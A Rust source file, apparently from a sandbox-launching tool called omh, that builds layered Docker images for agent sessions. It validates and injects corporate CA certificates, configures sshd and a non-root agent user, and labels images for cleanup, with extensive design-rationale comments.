//! Images.
//!
//! Two layers: a base every session shares, and a thin per-harness layer that
//! runs the adapter's install command. The base deliberately satisfies the
//! `sbx` kit contract — non-root `agent` at UID 1000, passwordless sudo,
//! `/home/agent`, proxy env forwarding — so the same image works on either
//! backend and an sbx kit becomes a two-line file rather than a port.

use crate::adapter::Adapter;
use crate::base::GRAPH_CACHE;
use anyhow::Result;
use std::path::Path;

/// The base tag carries a digest of its own recipe, for the same reason the
/// harness tag does: with a mutable `:latest`, `ensure` sees the tag present and
/// skips the build, so a base change never reaches an install that already
/// built it. Adding `socat` to the base silently did nothing until this.
pub fn base_tag(ca: Option<&str>) -> String {
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    base_dockerfile(ca).hash(&mut h);
    format!("omh/base:{:x}", h.finish())
}

/// Tag includes a digest of the recipe, so a Dockerfile omh ships actually
/// reaches an install that already built the old one. With a fixed `:latest`,
/// `ensure` saw the tag present and skipped the build — while `omh init`
/// reported "already built".
pub fn tag_for(adapter: &Adapter, ca: Option<&str>) -> String {
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    harness_dockerfile(adapter, ca).hash(&mut h);
    base_dockerfile(ca).hash(&mut h);
    format!("omh/{}:{:x}", adapter.name, h.finish())
}

/// The agent's home inside the sandbox.
///
/// Defined here because this is where it is *established* — the Dockerfile's
/// `usermod -d` below — and the same constant is interpolated into that
/// Dockerfile, so the image and the code that mounts into it cannot disagree.
///
/// Declared once because the alternative is consistency by copying: a literal
/// in `auth`, another in `container`, another in `doctor`, each with a comment
/// claiming it mirrors the others. That is consistent right up until it isn't,
/// and the symptom is a session that starts and reads nothing.
pub const GUEST_HOME: &str = "/home/agent";

/// A digest of an image recipe, for a note to pin.
///
/// Deliberately **not** `base_tag()`'s. That uses `DefaultHasher`, whose output
/// std explicitly does not guarantee across releases — fine for a tag, which is
/// ephemeral and local. A note is committed and travels, so pinning that value
/// would mark every image-triggered note in the repo stale on the day somebody
/// upgrades Rust: a mass false positive with no cause anybody could find.
///
/// `git hash-object` is a stable SHA-1 of the text, for ever, and shells out
/// exactly as `carry.rs` and `session.rs` already do.
///
/// It needs the git *binary* and not a repository, and `GIT_DIR` is pointed at
/// a path that cannot exist so it stays that way. Left to inherit the ambient
/// repository, the answer depends on where omh was launched from — measured:
///
///   no repository, or a sha1 one   bee8b835…  (40 hex)
///   a `--object-format=sha256` one  cf82dc1e…  (64 hex)
///   a dangling `.git`               fatal: not a git repository
///
/// The middle row is the one that matters, and it is the mass false positive
/// this function's doc argues against arriving by another road: a user whose
/// repo is SHA-256 pins digests nobody else's omh will ever compute, so every
/// image-pinned note in it reads stale. `--object-format` is not a fix — git
/// rejects it on `hash-object`. A `GIT_DIR` that resolves to nothing is,
/// and it closes the dangling-pointer row in the same line: that state is what
/// kept four tests here `#[ignore]`d until 2026.08, and `report.rs` records a
/// moved checkout producing one.
/// The exact `git` invocation `recipe_digest` makes.
///
/// Built here rather than inline so a test can run the real thing from a
/// directory of its choosing. Asserting that the env is *set* would be a claim
/// about the code's shape; running this command inside a `--object-format=sha256`
/// repository and getting 40 hex back is a claim about what it does.
fn digest_command() -> std::process::Command {
    let mut c = std::process::Command::new("git");
    // A directory that cannot exist, so no ambient repository decides the hash
    // algorithm. See the note on `recipe_digest`.
    c.env("GIT_DIR", "/omh-recipe-digest-has-no-repository")
        .args(["hash-object", "--stdin"]);
    c
}

pub fn recipe_digest(recipe: &str) -> Result<String> {
    use anyhow::Context;
    use std::io::Write;
    use std::process::Stdio;

    let mut child = digest_command()
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .context("running git hash-object")?;
    child
        .stdin
        .take()
        .context("no stdin")?
        .write_all(recipe.as_bytes())?;
    let out = child.wait_with_output()?;
    anyhow::ensure!(out.status.success(), "git hash-object failed");
    Ok(String::from_utf8(out.stdout)?.trim().to_string())
}

/// The corporate root this machine's traffic is inspected by, if one is set.
///
/// Read from the `ca_cert` setting — a path to a PEM on the host — because omh
/// cannot guess which of the host's trusted roots is the one doing the
/// inspecting, and injecting all of them would quietly widen what the sandbox
/// trusts. That is the opposite of what a sandbox is for.
///
/// **An unreadable path is an error, not an empty answer.** Somebody sets this
/// because their builds are failing; resolving a typo'd path to "no
/// certificate" would rebuild exactly the image that was already failing and
/// report success.
/// Where `ca_cert` points, if anywhere.
///
/// Split out so there is exactly **one** reading of the settings behind both
/// `ca_for` and `ca_path`. `ca_path` used to call `ca_for` for its refusals and
/// then read the settings again for the value, so the path it handed to
/// `docker run -v` was not the path whose PEM had been validated.
fn ca_setting(paths: &crate::profile::Paths) -> Result<Option<std::path::PathBuf>> {
    // `config::policy` rather than `policy_value`, which answers `Option` and
    // so spells "this repo sets no certificate" and "omh could not read this
    // repo's settings" the same way. `config::read_layer` deliberately
    // distinguishes them — a `chmod 000` settings file, a TOML syntax error —
    // and routing through the `Option` threw that away, so a repo whose
    // settings omh cannot parse built a certificate-free image and called it a
    // success.
    let settings = anyhow::Context::context(
        crate::config::policy(paths),
        "reading this repo's settings to resolve `ca_cert`",
    )?;
    Ok(settings
        .into_iter()
        .find(|s| s.key == "ca_cert")
        .map(|s| std::path::PathBuf::from(s.value)))
}

/// A corporate root omh has already refused if it could not be used.
///
/// **The only way to hold one is `Root::read`**, which is what makes every
/// claim the rest of this module used to make in a comment — "already refused
/// upstream", "safe by construction rather than by care" — a fact the compiler
/// keeps. Before this, `ca_for` answered a bare `String` and `ca_path` a bare
/// `PathBuf`, resolved separately: the pem that got hashed into the tag and the
/// path that got mounted into the cross-build were two readings that nothing
/// held together, and `ca_layer` accepted any `&str` in the program.
///
/// It carries the path as well as the text because both are needed and they
/// must agree. The recipe embeds the *content*; `memory::deliver` mounts the
/// *file*. Splitting them is what made `ca_path` exist, and `ca_path` is what
/// re-read the settings behind `ca_for`'s back.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Root {
    path: std::path::PathBuf,
    pem: String,
}

impl Root {
    /// Read the file `ca_cert` names, refusing anything that is not exactly
    /// certificates. **Every refusal this setting makes lives here**, which is
    /// the point: there is no other constructor.
    fn read(at: std::path::PathBuf) -> Result<Self> {
        // **Absolute, or docker invents a volume.** A relative `ca_cert`
        // resolves against the process CWD, so it reads fine and the image is
        // correct — while `docker run -v` treats a non-absolute source as a
        // *named volume* and mounts an empty directory where the certificate
        // should be. It is also meaningless as a committed value: this key is
        // `Secret::No`, so it arrives with a clone, where "the directory omh
        // happened to be run from" is not a shared fact.
        anyhow::ensure!(
            at.is_absolute(),
            "`ca_cert` names `{}`, which is not an absolute path. Docker reads \
             a relative `-v` source as a named volume, so the cross-build would \
             mount an empty directory where the certificate should be, and a \
             teammate who clones this repo resolves it somewhere else entirely. \
             Give the full path.",
            at.display()
        );
        // Cloned for the messages below, because `at` is moved into the
        // `Root` at the end and the refusals all want to name the file.
        let path_for_msg = at.clone();

        // The loop below binds its own `at` for a line number, so the path gets a
        // name of its own rather than being shadowed halfway through.
        // Bytes, not `read_to_string`. A real DER `.crt` is binary, so reading it
        // as text failed on the UTF-8 boundary and the reader got an encoding
        // error — while the message written for exactly that file, the one naming
        // the `openssl` conversion, sat below an `ensure!` it could never reach.
        let raw = anyhow::Context::with_context(std::fs::read(&at), || {
            format!(
                "reading the certificate named by `ca_cert` ({})",
                path_for_msg.display()
            )
        })?;
        anyhow::ensure!(
            !raw.is_empty(),
            "`ca_cert` names {}, which is empty. Nothing was converted wrongly — \
         there is no certificate in that file to convert.",
            path_for_msg.display()
        );
        let der_advice = || {
            format!(
                "`ca_cert` names {}, which is not a PEM certificate — a \
             `BEGIN CERTIFICATE` block is what this reads. A `.crt` in DER form \
             converts with `openssl x509 -inform der -in <file> -out <file>.pem`",
                path_for_msg.display()
            )
        };
        let pem = String::from_utf8(raw).map_err(|_| anyhow::anyhow!(der_advice()))?;
        anyhow::ensure!(pem.contains("BEGIN CERTIFICATE"), "{}", der_advice());

        // **Exactly certificates, and nothing else.** The docs promise a file
        // carrying `pkcs12` preamble is refused rather than rewritten, and for a
        // while only a quote or a backslash was refused — so a clean
        // `friendlyName: Acme Root CA` was accepted and `ca_layer` dropped it on
        // the way past, which is the rewrite the promise rules out.
        //
        // Anchored on the whole delimiter, not the substring: a CSR opens
        // `-----BEGIN CERTIFICATE REQUEST-----`, which contains `BEGIN
        // CERTIFICATE` and used to pass. And a block must close, because a clipped
        // paste of `security find-certificate -a` leaves one open — `ca_layer`
        // silently dropped the unterminated block and emitted a recipe with no
        // certificate in it at all, which builds green and trusts nothing.
        const BEGIN: &str = "-----BEGIN CERTIFICATE-----";
        const END: &str = "-----END CERTIFICATE-----";
        let mut open_at: Option<usize> = None;
        let mut blocks = 0usize;
        for (n, line) in pem.lines().enumerate() {
            let line = line.trim();
            let at = n + 1;
            if line == BEGIN {
                anyhow::ensure!(
                    open_at.is_none(),
                    "line {at} of {} opens a certificate while the one at line {} \
                 is still open — that file is not a sequence of PEM blocks.",
                    path_for_msg.display(),
                    open_at.unwrap_or(0)
                );
                open_at = Some(at);
            } else if line == END {
                anyhow::ensure!(
                    open_at.is_some(),
                    "line {at} of {} closes a certificate that was never opened.",
                    path_for_msg.display()
                );
                open_at = None;
                blocks += 1;
            } else if open_at.is_none() {
                anyhow::ensure!(
                    line.is_empty(),
                    "line {at} of {} sits outside any `BEGIN CERTIFICATE` / `END \
                 CERTIFICATE` block: `{}`. A `pkcs12` export carries `Bag \
                 Attributes` and `friendlyName:` preamble, and a `.pem` from a \
                 browser can carry a `subject=` line — omh will not drop them \
                 to make the file fit, because dropping is rewriting. Strip \
                 the file to the blocks and nothing else.",
                    path_for_msg.display(),
                    if line.len() > 60 { &line[..60] } else { line }
                );
            }
        }
        anyhow::ensure!(
            open_at.is_none(),
            "{} is truncated: the certificate opened at line {} has no matching \
         `END CERTIFICATE`. A clipped copy-paste does this, and omh will not \
         embed part of a certificate.",
            path_for_msg.display(),
            open_at.unwrap_or(0)
        );
        anyhow::ensure!(
            blocks > 0,
            "`ca_cert` names {}, which has no `-----BEGIN CERTIFICATE-----` block. \
         A certificate *request* is not a certificate, and neither is a \
         private key.",
            path_for_msg.display()
        );
        // Refused here, not neutralised in the recipe. `ca_layer` writes each line
        // as a single-quoted `printf` argument, and the first version dropped any
        // quote or backslash before writing — which mangles a file the user named
        // while the comment above it claimed to refuse one. Neither character can
        // appear in a PEM body; both appear in `openssl pkcs12` preamble lines,
        // and a company name with an apostrophe is not rare.
        for (n, line) in pem.lines().enumerate() {
            anyhow::ensure!(
                !line.contains(['\'', '\\']),
                "line {} of {} contains a quote or backslash, which cannot appear \
             in a PEM body. omh will not rewrite a certificate to make it fit \
             the recipe — strip the file down to the `BEGIN CERTIFICATE` / \
             `END CERTIFICATE` blocks and nothing else.",
                n + 1,
                path_for_msg.display()
            );
        }
        Ok(Self { path: at, pem })
    }

    /// The certificate text. What the recipe embeds, and therefore what the
    /// image tag is a digest of.
    pub fn pem(&self) -> &str {
        &self.pem
    }

    /// The file on this host. What the cross-build mounts read-only, because
    /// upstream's `rust:1-bookworm` has no recipe to bake it into.
    pub fn path(&self) -> &std::path::Path {
        &self.path
    }
}

pub fn ca_for(paths: &crate::profile::Paths) -> Result<Option<Root>> {
    let Some(at) = ca_setting(paths)? else {
        return Ok(None);
    };
    Ok(Some(Root::read(at)?))
}

/// The lines that teach the image to trust a corporate root, or nothing.
///
/// Behind a TLS-inspecting proxy every server the build reaches presents a
/// certificate signed by the company's own CA. The host trusts it; a container
/// does not, so the graph download and `npm install -g` the harness both fail
/// on an unknown issuer and no image can be built.
///
/// **Not `apt-get`**, which this used to claim. This layer is placed *after*
/// the package that provides `update-ca-certificates`, so if apt really failed
/// on an unknown issuer nothing here could help — the recipe would die three
/// lines above. It does not fail, because Debian's default sources are plain
/// HTTP. Naming it sent the reader to a fix that could not apply.
///
/// **Written into the recipe rather than passed as a build arg**, because the
/// tag is a digest of the recipe text: a build arg leaves that text identical,
/// so an image built without a certificate would be reused for somebody who
/// had set one and setting it would look like it did nothing. That is the
/// stale-tag failure `tag_for` records. Here the certificate is part of what
/// the image *is*.
///
/// `NODE_EXTRA_CA_CERTS` is not belt and braces. Node does not read the system
/// trust store, the base image is node, and the claude harness arrives through
/// `npm install -g` — so it is the fetch most likely to be the reason somebody
/// set this, and the one `update-ca-certificates` cannot reach.
///
/// **What is claimed here is what has been measured**, and the variables have
/// now been isolated. Three arms against a local `openssl s_server` presenting
/// a leaf signed by a self-signed root, on this recipe's `node:22-bookworm-slim`
/// base with the python, go and rust stacks installed:
///
/// | | no root | root in the store, no variables | this recipe |
/// |---|---|---|---|
/// | curl | `unable to get local issuer` | verifies | verifies |
/// | node | `UNABLE_TO_VERIFY_LEAF_SIGNATURE` | **`UNABLE_TO_VERIFY_LEAF_SIGNATURE`** | verifies |
/// | python | `CERTIFICATE_VERIFY_FAILED` | verifies | verifies |
/// | git | `server certificate verification failed` | verifies | verifies |
/// | go | `x509: certificate signed by unknown authority` | verifies | verifies |
/// | pip | `CERTIFICATE_VERIFY_FAILED` | verifies | verifies |
/// | cargo | `SSL certificate is invalid; class=Ssl` | verifies | verifies |
///
/// So the middle column is the finding: on this base image
/// `update-ca-certificates` is enough for six of the seven, Debian's pip
/// included — its vendored certifi resolves to `/etc/ssl/certs/ca-certificates.crt`.
/// Only `NODE_EXTRA_CA_CERTS` is load-bearing. The other six are kept because
/// they cost nothing and cover a base image that patches its tools
/// differently, and they are described that way rather than as each being what
/// makes its tool work. An earlier version of this comment said "three of the
/// four do not read the system store", which was a stronger claim than any
/// measurement then supported.
///
/// `omh doctor` is what checks the root actually arrived on a given machine;
/// the table above is what the recipe was designed against.
fn ca_layer(ca: Option<&str>) -> String {
    let Some(pem) = ca else {
        return String::new();
    };
    const DIR: &str = "/usr/local/share/ca-certificates";
    const NODE_AT: &str = "/usr/local/share/omh-ca.pem";
    const BUNDLE: &str = "/etc/ssl/certs/ca-certificates.crt";

    // **One file per certificate**, because `update-ca-certificates` treats
    // each file under `DIR` as exactly one. Measured against a real build with
    // a two-certificate bundle in one file: it prints `rehash: warning:
    // skipping omh-ca.pem, it does not contain exactly one certificate or CRL`
    // and `1 added`. Both roots still reach `BUNDLE`, so the five variables
    // pointing there work — but no `<hash>.0` symlink is written, and
    // `SSL_CERT_DIR`, which this recipe also sets, cannot find the root by
    // hash. Corporate IT hands out a chain more often than a single root, so
    // this is the common case rather than the edge one.
    //
    // Only the marked blocks travel — but nothing unmarked ever gets this far
    // any more. This used to *drop* `pkcs12` preamble, which is a rewrite of a
    // file the user named, while both doc pages promised a refusal; `ca_for`
    // now refuses it, so this loop is a parser rather than an editor.
    let mut blocks: Vec<Vec<&str>> = Vec::new();
    let mut current: Option<Vec<&str>> = None;
    for line in pem.lines() {
        if line.contains("BEGIN CERTIFICATE") {
            current = Some(Vec::new());
        }
        if let Some(block) = current.as_mut() {
            block.push(line);
            if line.contains("END CERTIFICATE") {
                blocks.push(current.take().expect("just pushed into it"));
            }
        }
    }

    // One quoted argument per line. A heredoc would be shorter and is not
    // portable to every builder omh may meet; `printf` with the lines quoted
    // is. Nothing is escaped or stripped here — `ca_for` has already refused a
    // file carrying a quote or a backslash, which is what makes this safe by
    // construction rather than by care.
    let mut out = String::from(
        "\n# The corporate root this machine's traffic is inspected by, from\n         # `omh set --local ca_cert`. Placed after the package that provides\n         # `update-ca-certificates`, and before the first fetch that needs it.\n         RUN mkdir -p /usr/local/share/ca-certificates \\\n",
    );
    for (n, block) in blocks.iter().enumerate() {
        out.push_str(" && printf '%s\\n' \\\n");
        for line in block {
            out.push_str(&format!("      '{line}' \\\n"));
        }
        out.push_str(&format!("      > {DIR}/omh-ca-{}.crt \\\n", n + 1));
    }
    // Node reads one file, not a directory, so it gets the chain back in one
    // piece — outside `DIR`, where `update-ca-certificates` would find it and
    // print the skip warning this split exists to avoid.
    out.push_str(&format!(
        " && cat {DIR}/omh-ca-*.crt > {NODE_AT} \\\n && update-ca-certificates\n"
    ));

    // `update-ca-certificates` fixes the **system** store, and not every
    // toolchain reads it. pip ships its own `certifi`; node reads one named
    // file. So setting only the system store would leave the `tools` provide
    // in `stacks/python.toml` — `pip3 install --break-system-packages
    // --no-cache-dir pytest ruff` — failing exactly as before, and whoever set
    // `ca_cert` would reasonably conclude the setting does not work.
    //
    // The quotation is the whole line, not a shortened one. It used to read
    // `pip3 install pytest ruff`, which is not what that file says.
    //
    // On the image rather than at launch, so a stack layer building *on top*
    // of this gets them too: the `curl` that fetches rustup, `pip3 install`
    // and `corepack` all run at build time, which is where the failure this
    // fixes actually happens. **rustup itself is not named**: what needs the
    // root there is the `curl | sh` that downloads it, which the system store
    // covers — `CARGO_HTTP_CAINFO` is cargo's, and whether rustup honours any
    // of these is a fact about their software that nothing here has measured.
    out.push_str(&format!(
        "ENV SSL_CERT_FILE={BUNDLE} \\\n         \x20   SSL_CERT_DIR=/etc/ssl/certs \\\n         \x20   NODE_EXTRA_CA_CERTS={NODE_AT} \\\n         \x20   REQUESTS_CA_BUNDLE={BUNDLE} \\\n         \x20   PIP_CERT={BUNDLE} \\\n         \x20   CARGO_HTTP_CAINFO={BUNDLE} \\\n         \x20   GIT_SSL_CAINFO={BUNDLE}\n"
    ));

    // And again where an ssh login will find them. `ENV` covers the image and
    // everything `docker exec` starts — which is `omh s run` and `attach` — but
    // sshd does not pass its own environment to a session: it builds one from
    // PAM, and `PermitUserEnvironment` is off by default. A session reached
    // from VS Code, Zed or JetBrains Gateway (`src/ssh.rs`) therefore gets the
    // system store, which `update-ca-certificates` fixed, and none of the
    // variables — so `curl` and `git` work there and `npm install`, `pip
    // install` and `cargo add` do not. The build succeeds and the session
    // half-works, which is the worst of the three outcomes.
    //
    // `/etc/environment` is read by `pam_env`, which sshd runs.
    out.push_str(&format!(
        "RUN printf '%s\\n' \\\n      \'SSL_CERT_FILE={BUNDLE}\' \\\n      \'SSL_CERT_DIR=/etc/ssl/certs\' \\\n      \'NODE_EXTRA_CA_CERTS={NODE_AT}\' \\\n      \'REQUESTS_CA_BUNDLE={BUNDLE}\' \\\n      \'PIP_CERT={BUNDLE}\' \\\n      \'CARGO_HTTP_CAINFO={BUNDLE}\' \\\n      \'GIT_SSL_CAINFO={BUNDLE}\' \\\n      >> /etc/environment\n"
    ));
    out
}

pub fn base_dockerfile(ca: Option<&str>) -> String {
    // Interpolated rather than written out, so the directory the image
    // prepares and the directory the launcher mounts into cannot drift.
    let notes = crate::memory::GUEST_LOCAL_NOTES;
    let ca_layer = ca_layer(ca);
    // node:*-slim ships a `node` user already holding UID 1000, so rename it
    // rather than fighting it — sbx requires that UID to be `agent`.
    format!(
        r#"FROM node:22-bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      ca-certificates git ripgrep dtach sudo curl less jq procps openssh-server socat \
 && rm -rf /var/lib/apt/lists/*
{ca_layer}
RUN usermod -l agent -d {GUEST_HOME} -m node \
 && groupmod -n agent node \
 && echo 'agent ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/agent \
 && chmod 0440 /etc/sudoers.d/agent

# Assert the sbx kit contract at build time rather than assuming it. If a future
# base image moves UID 1000, this fails here instead of failing mysteriously
# inside a sandbox.
RUN test "$(id -u agent)" = "1000" && test "$(getent passwd agent | cut -d: -f6)" = "{GUEST_HOME}"

# The base set lives here, not in a harness layer: a code graph is
# harness-agnostic and every session should get the same one.
ARG TARGETARCH
RUN __GRAPH_INSTALL__

# Mount points the launcher expects to exist, owned by the unprivileged user.
# The graph cache is a volume; the image only needs the directory to exist and
# be owned by the agent, or docker creates it as root.
RUN mkdir -p /work /omh/sock /omh/cache /omh/layers {notes} {GRAPH_CACHE} \
 && chown -R agent:agent /work /omh {GUEST_HOME}/.cache

# Session entrypoint: install the key, start sshd, then stay alive so the
# container outlives the command that created it. The key arrives as an env var
# because a bind-mounted authorized_keys lands with host ownership and sshd
# silently refuses to read one it does not trust.
RUN printf '%s\n' \
  '#!/bin/sh' \
  'set -e' \
  'mkdir -p "$HOME/.ssh" && chmod 700 "$HOME/.ssh"' \
  'if [ -n "$OMH_PUBKEY" ]; then' \
  '  printf "%s\\n" "$OMH_PUBKEY" > "$HOME/.ssh/authorized_keys"' \
  '  chmod 600 "$HOME/.ssh/authorized_keys"' \
  'fi' \
  'sudo ssh-keygen -A >/dev/null 2>&1 || true' \
  'sudo mkdir -p /run/sshd' \
  'sudo /usr/sbin/sshd' \
  'exec sleep infinity' \
  > /usr/local/bin/omh-session \
 && chmod 0755 /usr/local/bin/omh-session

# Proxy forwarding, for backends that filter egress through one.
ENV HTTP_PROXY="" HTTPS_PROXY="" NO_PROXY=""

USER agent
WORKDIR /work
"#
    )
    .replace("__GRAPH_INSTALL__", &crate::base::graph_install())
}

pub fn harness_dockerfile(adapter: &Adapter, ca: Option<&str>) -> String {
    // Install as root, run as agent: an image that ends privileged would hand
    // the agent the sandbox's own escape hatch.
    let mut df = format!(
        "FROM {}\nUSER root\nRUN {}\n",
        base_tag(ca),
        adapter.install
    );

    // Docker creates a missing mount parent as root, leaving the agent unable
    // to write beside its own config — atomic credential writes and transcripts
    // both fail, the first of them silently.
    let dirs = mount_parents(adapter);
    if !dirs.is_empty() {
        df.push_str(&format!(
            "RUN mkdir -p {0} && chown -R agent:agent {0}\n",
            dirs.join(" ")
        ));
    }
    df.push_str("USER agent\nWORKDIR /work\n");
    df
}

/// A third layer: what this repo's stacks put in the image.
///
/// The same shape as `harness_dockerfile`, one layer further out, with one
/// `RUN` per provide that fired — in the order the stack file gave them,
/// because `corepack enable pnpm` needs the node the provide above it asserted.
/// An ordered list is how a stack file expresses that dependency without a
/// graph, and a graph would be a second way to say what the order already says.
///
/// Root to install, `agent` to run, exactly as the harness layer: an image that
/// ends privileged hands the agent the sandbox's own escape hatch.
pub fn stack_dockerfile(adapter: &Adapter, installs: &[&str], ca: Option<&str>) -> String {
    let mut df = format!("FROM {}\nUSER root\n", tag_for(adapter, ca));
    for install in installs {
        df.push_str(&format!("RUN {install}\n"));
    }
    df.push_str("USER agent\nWORKDIR /work\n");
    df
}

/// The image a session runs, given what this repo's stacks provide.
///
/// Reached through `main::sandbox`, which is the single place that decides —
/// `container::plan` takes the answer as `Options.image` and re-derives
/// nothing. It was not always so: for one milestone `plan` hardcoded
/// `tag_for(adapter)`, so this tag was built by `init` and run by nobody, and
/// no test noticed. `a_session_runs_the_image_the_caller_resolved` is the guard
/// that closed it.
///
/// Keyed on the **recipe**, which is the recorded installs in order — so a pnpm
/// repo and a yarn repo do not share an image, and a reordered stack file is a
/// different image too. That is slightly stronger than keying on the set of
/// provides recorded, and strictly more correct: it is what the image contains.
///
/// Nothing to install is the harness image itself rather than an empty layer
/// on top of it. A provide that applies but installs nothing — the `runtime`
/// assertion in `stacks/node.toml` — correctly does not move the tag, because
/// it changes nothing about the image.
pub fn stack_tag(adapter: &Adapter, installs: &[&str], ca: Option<&str>) -> String {
    if installs.is_empty() {
        return tag_for(adapter, ca);
    }
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    stack_dockerfile(adapter, installs, ca).hash(&mut h);
    tag_for(adapter, ca).hash(&mut h);
    base_dockerfile(ca).hash(&mut h);
    format!("omh/{}:{:x}", adapter.name, h.finish())
}

/// Build the base, the harness layer and this repo's stack layer if missing,
/// and hand back the tag a session should run.
///
/// Returns the tag rather than letting the caller recompute it: two places
/// deciding which image to run is how a session ends up in one image while
/// `init` reported another.
///
/// Every caller now gets it from one `main::sandbox` call and hands the same
/// value to `container::plan`, so the layer that is built and the image that
/// runs are the same string by construction.
///
/// No test calls this: it builds an image, and there is no container runtime in
/// the dev sandbox. Its construction — `stack_tag` and `stack_dockerfile` — is
/// tested thoroughly; that the build *works* is `omh doctor`'s to prove, which
/// is the coverage line `CLAUDE.md` draws and not one a green suite can cross.
pub fn ensure_stack(
    program: &str,
    adapter: &Adapter,
    installs: &[&str],
    ca: Option<&str>,
    repo: &Path,
) -> Result<String> {
    ensure(program, adapter, ca)?;
    let tag = stack_tag(adapter, installs, ca);
    if tag != tag_for(adapter, ca) && !exists(program, &tag) {
        eprintln!("omh: building {tag} — this repo's toolchain, first run only");
        build(
            program,
            &tag,
            &stack_dockerfile(adapter, installs, ca),
            &Kind::Stack(adapter, repo),
            ca,
        )?;
    }
    Ok(tag)
}

/// Parents of every mount target under the agent's home.
///
/// The home itself is excluded — the base image already owns it — and
/// `/work` is a mount omh controls rather than one the image prepares.
fn mount_parents(adapter: &Adapter) -> Vec<String> {
    let mut dirs: Vec<String> = adapter
        .capabilities
        .values()
        .map(|b| b.path.clone())
        .chain(adapter.creds.iter().cloned())
        .chain(adapter.token.iter().cloned())
        .filter_map(|template| {
            let path = crate::adapter::expand(template.trim_end_matches('/'), GUEST_HOME);
            // `/work` is a mount omh owns; only the home side needs preparing.
            if !path.starts_with(GUEST_HOME) {
                return None;
            }
            path.parent().map(|p| p.display().to_string())
        })
        .filter(|d| d != GUEST_HOME)
        .collect();
    dirs.sort();
    dirs.dedup();
    dirs
}

/// `docker build` arguments. The Dockerfile arrives on stdin, so nothing is
/// written to disk and the build context stays empty.
///
/// The class is stamped on as labels because the tag cannot carry it: a tag is
/// a hash of a recipe and says nothing about what kind of thing it names, and
/// `reap` has to know. See `Kind`.
pub fn build_args(tag: &str, context: &Path, kind: &Kind) -> Vec<String> {
    let mut a: Vec<String> = vec!["build".into(), "-t".into(), tag.into()];
    for (k, v) in kind.stamp() {
        a.push("--label".into());
        a.push(format!("{k}={v}"));
    }
    a.extend([
        "-f".into(),
        "-".into(),
        context.to_string_lossy().into_owned(),
    ]);
    a
}

/// What an image omh built *is*, as opposed to what it is called.
///
/// This exists because the first reaper did not have it and guessed instead,
/// from the one thing a tag does carry — its repository. The guess is wrong,
/// and not subtly: `tag_for` and `stack_tag` both format
/// `omh/{adapter}:{hash}`, so `omh/claude` holds the harness layer *and* one
/// stack layer per checkout, all of them current. Reading the repository as the
/// class made a stack build delete the harness image it had just been built
/// from; the next launch rebuilt the harness, and that build deleted the stack.
/// Two multi-minute builds on every launch, for ever, from a change whose whole
/// purpose was to stop rebuilds.
///
/// The repository is not the equivalence class and no amount of parsing makes
/// it one. Docker keeps labels beside the image, so the class travels with the
/// thing it describes and cannot drift from it — the same reason
/// `Plan::labels` stamps a container with what it was made of.
///
/// An image built before omh stamped anything carries no `omh.*` labels, is in
/// no class, and is never reaped. That is deliberate: the alternative is an
/// empty class matching every unlabelled image on the machine.
pub enum Kind<'a> {
    /// One recipe per omh version, shared by every adapter and every checkout.
    Base,
    /// One recipe per adapter per omh version.
    Harness(&'a Adapter),
    /// One per *checkout*, because the recipe is that repo's toolchain. This is
    /// the case a repository cannot express.
    ///
    /// `repo` is the checkout's full path and not `Paths::repo_name`, which is
    /// a directory basename: two checkouts both called `api` would otherwise
    /// share a class and reap each other, which is the same bug one level
    /// quieter. A host path in image metadata is already the house style —
    /// `Plan::labels` puts whole mount paths in `omh.mounts`.
    Stack(&'a Adapter, &'a Path),
}

impl Kind<'_> {
    /// The labels that identify this class. Two images with equal stamps are
    /// the same kind of thing built from different recipes, which is exactly
    /// when the older one is dead.
    pub fn stamp(&self) -> Vec<(String, String)> {
        let mut s = vec![("omh.kind".to_string(), self.name().to_string())];
        match self {
            Kind::Base => {}
            Kind::Harness(a) => s.push(("omh.adapter".into(), a.name.clone())),
            Kind::Stack(a, repo) => {
                s.push(("omh.adapter".into(), a.name.clone()));
                s.push(("omh.repo".into(), repo.to_string_lossy().into_owned()));
            }
        }
        s
    }

    fn name(&self) -> &'static str {
        match self {
            Kind::Base => "base",
            Kind::Harness(_) => "harness",
            Kind::Stack(..) => "stack",
        }
    }

    /// `docker images` arguments listing exactly this class.
    ///
    /// Docker applies `--filter label=k=v` as exact equality and ANDs repeated
    /// ones, so the match is docker's to make and omh never parses a label
    /// value back — which matters because two of the three values are free
    /// text: an adapter's `name` comes from a TOML file a user can drop in, and
    /// a checkout path can contain very nearly anything. Verified 2026-08-20
    /// against docker 29.7.2 that `--filter label=omh.repo=/checkouts/a,b`
    /// matches that image and only that image, comma and all.
    ///
    /// Deliberately not scoped to a repository as well. One notion of "same
    /// kind" is enough, and the second one is what broke this.
    pub fn list_args(&self) -> Vec<String> {
        let mut a: Vec<String> = vec!["images".into()];
        for (k, v) in self.stamp() {
            a.push("--filter".into());
            a.push(format!("label={k}={v}"));
        }
        a.extend(["--format".into(), "{{.Repository}}:{{.Tag}}".into()]);
        a
    }
}

/// Arguments that run a short diagnostic script inside the image, and nothing
/// else.
///
/// Deliberately mountless. `omh doctor` builds a full `container::plan` because
/// it is checking mounted files; this probe asks only *what does this image
/// have on PATH*, and every mount it does not take is a way it cannot end up
/// answering about the host instead. That confusion — host evidence standing in
/// for a fact about the sandbox — is what the probe exists to end, so it must
/// not be reachable from inside the probe itself.
///
/// No `-w` either: the answer must not depend on where the script starts.
pub fn probe_args(tag: &str, script: &str) -> Vec<String> {
    vec![
        "run".into(),
        "--rm".into(),
        // Never fetch. `docker run` defaults to `--pull=missing`, and omh's
        // tags carry no registry prefix, so a tag whose image is not here
        // resolves against Docker Hub — for a name every user of a given omh
        // version shares and anybody can precompute from this repository. A
        // squatted `omh/*` would be pulled and run, and its `ENTRYPOINT` runs
        // ahead of the `sh -c` below, so overriding the command saves nothing.
        //
        // This is the one path that runs an image `ensure*` has not just built,
        // which is what makes the default reachable at all.
        "--pull=never".into(),
        tag.into(),
        "sh".into(),
        "-c".into(),
        script.into(),
    ]
}

/// Build the base and the harness layer if they are missing. Progress goes
/// straight to the terminal: a multi-minute silent step reads as a hang.
